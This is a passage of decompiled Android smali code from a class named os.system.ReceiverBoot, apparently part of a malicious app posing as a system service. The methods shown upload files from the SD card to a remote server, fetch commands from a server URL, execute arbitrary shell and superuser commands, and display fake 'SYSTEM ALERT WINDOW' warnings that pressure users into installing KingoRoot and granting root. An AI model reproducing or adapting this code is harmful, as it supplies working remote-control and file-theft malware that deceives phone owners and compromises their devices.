    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 765
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_0

    .line 767
    const-string v0, "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}"

    move-object v0, v1

    .line 839
    :goto_0
    return-object v0

    .line 771
    :cond_0
    new-instance v9, Ljava/io/FileInputStream;

    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v9, v4}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 773
    new-instance v4, Ljava/net/URL;

    invoke-direct {v4, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 774
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    .line 775
    const/4 v4, 0x1

    invoke-virtual {v0, v4}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 776
    const/4 v4, 0x1

    invoke-virtual {v0, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 777
    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 778
    const-string v4, "POST"

    invoke-virtual {v0, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 780
    const-string v4, "Connection"

    const-string v10, "Keep-Alive"

    invoke-virtual {v0, v4, v10}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 781
    const-string v4, "Content-Type"

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "multipart/form-data;boundary="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v4, v10}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 784
    new-instance v10, Ljava/io/DataOutputStream;

    .line 785
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v10, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 786
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v10, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 787
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Content-Disposition: form-data; name=\"filUpload\";filename=\""

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 788
    invoke-virtual {v10, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 790
    invoke-virtual {v9}, Ljava/io/FileInputStream;->available()I

    move-result v3

    .line 791
    invoke-static {v3, v5}, Ljava/lang/Math;->min(II)I

    move-result v3

    .line 792
    new-array v11, v3, [B

    .line 795
    const/4 v4, 0x0

    invoke-virtual {v9, v11, v4, v3}, Ljava/io/FileInputStream;->read([BII)I

    move-result v4

    .line 797
    :goto_1
    if-lez v4, :cond_1

    .line 798
    const/4 v4, 0x0

    invoke-virtual {v10, v11, v4, v3}, Ljava/io/DataOutputStream;->write([BII)V

    .line 799
    invoke-virtual {v9}, Ljava/io/FileInputStream;->available()I

    move-result v3

    .line 800
    invoke-static {v3, v5}, Ljava/lang/Math;->min(II)I

    move-result v3

    .line 801
    const/4 v4, 0x0

    invoke-virtual {v9, v11, v4, v3}, Ljava/io/FileInputStream;->read([BII)I

    move-result v4

    goto :goto_1

    .line 804
    :cond_1
    invoke-virtual {v10, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 805
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 808
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v3

    .line 809
    const/16 v4, 0xc8

    if-ne v3, v4, :cond_3

    .line 811
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    .line 812
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 815
    :goto_2
    invoke-virtual {v0}, Ljava/io/InputStream;->read()I

    move-result v4

    const/4 v5, -0x1

    if-eq v4, v5, :cond_2

    .line 816
    invoke-virtual {v2, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 833
    :catch_0
    move-exception v0

    .line 835
    const-string v0, "uploaderror"

    sput-object v0, Los/system/ReceiverBoot;->requestResultUpload:Ljava/lang/String;

    move-object v0, v1

    .line 837
    goto/16 :goto_0

    .line 818
    :cond_2
    :try_start_1
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    .line 819
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 820
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v4}, Ljava/lang/String;-><init>([B)V

    .line 823
    :goto_3
    const-string v2, "resCode="

    invoke-static {v3}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 824
    const-string v2, "resMessage="

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 826
    invoke-virtual {v9}, Ljava/io/FileInputStream;->close()V

    .line 827
    invoke-virtual {v10}, Ljava/io/DataOutputStream;->flush()V

    .line 828
    invoke-virtual {v10}, Ljava/io/DataOutputStream;->close()V

    .line 830
    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    .line 831
    sput-object v0, Los/system/ReceiverBoot;->requestResultUpload:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    :cond_3
    move-object v0, v2

    goto :goto_3
.end method

.method public requestWeb()Ljava/lang/String;
    .locals 5

    .prologue
    const v2, 0xc350

    .line 896
    const-string v0, ""

    .line 897
    new-instance v1, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v1}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 898
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 899
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 901
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2, v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 902
    new-instance v1, Lorg/apache/http/client/methods/HttpGet;

    sget-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    invoke-direct {v1, v3}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 904
    :try_start_0
    invoke-interface {v2, v1}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 907
    :try_start_1
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v1

    .line 908
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 909
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 911
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 912
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 916
    :catch_0
    move-exception v1

    .line 917
    :try_start_2
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v2, "Error split text"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 923
    :goto_1
    return-object v0

    .line 914
    :cond_0
    :try_start_3
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 915
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v0

    goto :goto_1

    .line 920
    :catch_1
    move-exception v1

    .line 921
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v2, "Failed rece Connect to Server!"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method public rootCommands([Ljava/lang/String;)V
    .locals 5

    .prologue
    .line 543
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 544
    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 546
    array-length v2, p1

    const/4 v0, 0x0

    :goto_0
    if-ge v0, v2, :cond_0

    aget-object v3, p1, v0

    .line 547
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 546
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 549
    :cond_0
    const-string v0, "exit\n"

    invoke-virtual {v1, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 550
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 552
    :goto_1
    return-void

    .line 551
    :catch_0
    move-exception v0

    goto :goto_1
.end method

.method public rooting(Landroid/content/Context;)V
    .locals 11

    .prologue
    const/16 v4, 0x30

    const/4 v8, 0x0

    .line 215
    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v0

    const-string v1, "root"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 216
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 217
    const/4 v0, 0x1

    sput-boolean v0, Los/system/ReceiverBoot;->rootResult:Z

    .line 219
    :cond_0
    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v0

    const-string v1, "tolak user"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 220
    const-string v0, "root android state............TOLAK USER\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 221
    sput-boolean v8, Los/system/ReceiverBoot;->rootResult:Z

    .line 222
    const-string v2, "aktif"

    const/high16 v3, -0x10000

    const-string v5, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can\'t access binary system to update manager\n\n\n"

    move-object v0, p0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 224
    :cond_1
    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v0

    const-string v1, "tidak root"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 225
    const-string v0, "root android state.............NO ROOT\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 226
    sput-boolean v8, Los/system/ReceiverBoot;->rootResult:Z

    .line 227
    new-instance v0, Los/system/MainActivity;

    invoke-direct {v0}, Los/system/MainActivity;-><init>()V

    const-string v1, "kingoroot.supersu"

    const-string v2, "open"

    invoke-virtual {v0, p1, v1, v2}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 229
    const-string v0, "install KINGOROOT..............\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 231
    const-string v7, "mati"

    const-string v10, ""

    move-object v5, p0

    move-object v6, p1

    move v9, v8

    invoke-virtual/range {v5 .. v10}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 232
    const-string v2, "aktif"

    const/16 v3, -0x100

    const-string v5, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can\'t access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    move-object v0, p0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 234
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/kroot.apk"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 236
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 237
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v2

    const-string v3, "application/vnd.android.package-archive"

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 238
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 239
    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 240
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 248
    :cond_2
    :goto_0
    return-void

    .line 243
    :cond_3
    const-string v0, "install KINGOROOT.............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 244
    const-string v7, "mati"

    const-string v10, ""

    move-object v5, p0

    move-object v6, p1

    move v9, v8

    invoke-virtual/range {v5 .. v10}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 245
    const-string v2, "aktif"

    const v3, -0xff0100

    const-string v5, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n"

    move-object v0, p0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    goto :goto_0
.end method

.method public setServer(Z)Ljava/lang/String;
    .locals 2

    .prologue
    .line 254
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkRun()[Z

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->flags:[Z

    .line 255
    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    const/4 v1, 0x0

    aget-boolean v0, v0, v1

    if-eqz v0, :cond_1

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    const/4 v1, 0x1

    aget-boolean v0, v0, v1

    if-eqz v0, :cond_1

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    const/4 v1, 0x2

    aget-boolean v0, v0, v1

    if-eqz v0, :cond_1

    .line 257
    if-nez p1, :cond_0

    .line 258
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->stopSrv()V

    .line 259
    const-string v0, "server stoping"

    .line 271
    :goto_0
    return-object v0

    .line 262
    :cond_0
    const-string v0, "server running"

    goto :goto_0

    .line 266
    :cond_1
    if-eqz p1, :cond_2

    .line 267
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->runSrv()V

    .line 268
    const-string v0, "server running"

    goto :goto_0

    .line 271
    :cond_2
    const-string v0, ""

    goto :goto_0
.end method

.method public shared(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .prologue
    .line 132
    iget-object v0, p0, Los/system/ReceiverBoot;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0, p1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 133
    iget-object v0, p0, Los/system/ReceiverBoot;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 134
    return-void
.end method

.method public shellCommands(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    .prologue
    .line 556
    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    .line 560
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 561
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    .line 562
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 564
    const-string v0, ""

    .line 565
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 566
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "\n"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 570
    :catch_0
    move-exception v0

    .line 571
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 573
    :cond_0
    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    .line 574
    return-object v0
.end method

.method public textSplit(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    .prologue
    .line 579
    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    .line 580
    invoke-virtual {p1, p2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 582
    const/4 v0, 0x0

    :goto_0
    array-length v3, v2

    if-ge v0, v3, :cond_0

    .line 583
    aget-object v3, v2, v0

    invoke-virtual {v1, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 582
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 585
    :cond_0
    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public toastImage(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 4

    .prologue
    const/4 v3, 0x0

    .line 687
    new-instance v0, Landroid/widget/Toast;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/widget/Toast;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    .line 688
    iget-object v0, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0, p3, v3, v3}, Landroid/widget/Toast;->setGravity(III)V

    .line 689
    iget-object v0, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    new-instance v1, Los/system/ReceiverBoot$ViewKu;

    const-string v2, ""

    invoke-direct {v1, p0, p1, p2, v2}, Los/system/ReceiverBoot$ViewKu;-><init>(Los/system/ReceiverBoot;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/widget/Toast;->setView(Landroid/view/View;)V

    .line 691
    iget-object v0, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v0

    .line 692
    invoke-virtual {v0, v3}, Landroid/view/View;->setBackgroundColor(I)V

    .line 693
    return-void
.end method

.method public toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V
    .locals 6

    .prologue
    const-wide/16 v4, 0x64

    .line 99
    sget v0, Los/system/ReceiverBoot;->delayToast:I

    if-eqz v0, :cond_0

    .line 100
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 102
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "count"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, Los/system/ReceiverBoot;->delayToast:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 103
    invoke-virtual {p0, p1, p5, p3, p4}, Los/system/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;II)V

    .line 105
    new-instance v0, Los/system/ReceiverBoot$2;

    sget v1, Los/system/ReceiverBoot;->delayToast:I

    int-to-long v2, v1

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Los/system/ReceiverBoot$2;-><init>(Los/system/ReceiverBoot;JJ)V

    .line 113
    invoke-virtual {v0}, Los/system/ReceiverBoot$2;->start()Landroid/os/CountDownTimer;

    .line 126
    :goto_0
    return-void

    .line 115
    :cond_0
    const-string v0, "aktif"

    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget v0, Los/system/ReceiverBoot;->delayToast:I

    if-nez v0, :cond_1

    .line 117
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "handler:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

